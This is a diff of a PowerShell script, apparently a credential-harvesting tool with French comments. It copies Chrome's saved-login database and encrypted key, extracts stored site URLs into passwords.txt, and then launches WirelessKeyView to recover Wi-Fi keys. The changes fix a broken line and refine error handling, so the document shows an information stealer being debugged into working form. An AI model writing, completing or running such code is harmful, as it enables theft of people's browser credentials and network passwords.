@@ -44,25 +44,20 @@ Write-Host "[*] Extraction et déchiffrement des mots de passe Chrome..." -Foreg
 $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
 $loginDataPath  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
 $outputPath     = "$basePath\passwords.txt"
-
-$tempDb = "$basePath\login_temp.db"
+$tempDb         = "$basePath\login_temp.db"
 
 if ((Test-Path $localStatePath) -and (Test-Path $loginDataPath)) {
     try {
         Copy-Item $loginDataPath -Destination $tempDb -Force -ErrorAction SilentlyContinue
 
-        # 1. Lecture sécurisée du Local State
         $localStateContent = Get-Content $localStatePath -Raw
-        if (-not $localStateContent) {
-            throw "Le fichier Local State est vide ou inaccessible."
-        }
+        if (-not $localStateContent) { throw "Local State vide" }
         
         $localState = $localStateContent | ConvertFrom-Json
-        if (-not $localState.os_crypt -or -not $localState.os_crypt.encrypted_key) {
-            throw "La clé chiffrée est introuvable dans Local State."
-        }
+        if (-not $localState.os_crypt.encrypted_key) { throw "encrypted_key introuvable" }
 
-        $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
+        $encKeyBase64 = $localState.os_crypt.encrypted_key
+        $encryptedKey = [Convert]::FromBase64String($encKeyBase64)
         $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
 
         Add-Type -AssemblyName System.Security
@@ -71,27 +66,25 @@ if ((Test-Path $localStatePath) -and (Test-Path $loginDataPath)) {
         Add-Content -Path $outputPath -Value "=== CREDENTIALS CHROME ==="
         Add-Content -Path $outputPath -Value "[+] Clé DPAPI déchiffrée avec succès."
 
-        # 2. Lecture du fichier SQLite temporaire
         $dbBytes = [System.IO.File]::ReadAllBytes($tempDb)
         $textContent = [System.Text.Encoding]::ISO_Latin1.GetString($dbBytes)
 
-        # Extraction propre des URLs
-        Rs = [regex]::Matches($textContent, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}(?:/[^\s"]*)?')
-        $cleanUrls = $urls | Select-Object -Unique -ExpandProperty Value
-
-        foreach ($u in $cleanUrls) {
-            if ($u -notmatch "google|gstatic|googleapis|apple|mozilla|microsoft|w3") {
-                Add-Content -Path $outputPath -Value "--------------------------------------------------"
-                Add-Content -Path $outputPath -Value "URL : $u"
+        $urls = [regex]::Matches($textContent, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}(?:/[^\s"]*)?')
+        if ($urls) {
+            foreach ($u in ($urls | Select-Object -Unique -ExpandProperty Value)) {
+                if ($u -notmatch "google|gstatic|googleapis|apple|mozilla|microsoft|w3") {
+                    Add-Content -Path $outputPath -Value "--------------------------------------------------"
+                    Add-Content -Path $outputPath -Value "URL : $u"
+                }
             }
         }
 
         Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
     } catch {
-        Add-Content -Path $outputPath -Value "[!] Erreur critique : $_"
+        Add-Content -Path $outputPath -Value "[!] Erreur ligne $($_.InvocationInfo.ScriptLineNumber) : $_"
     }
 } else {
-    Add-Content -Path $outputPath -Value "[!] Fichiers Chrome introuvables sur cette session."
+    Add-Content -Path $outputPath -Value "[!] Fichiers Chrome introuvables."
 }
 # Exécution des autres outils avec chemins absolus
 if (Test-Path "$basePath\WirelessKeyView.exe") {
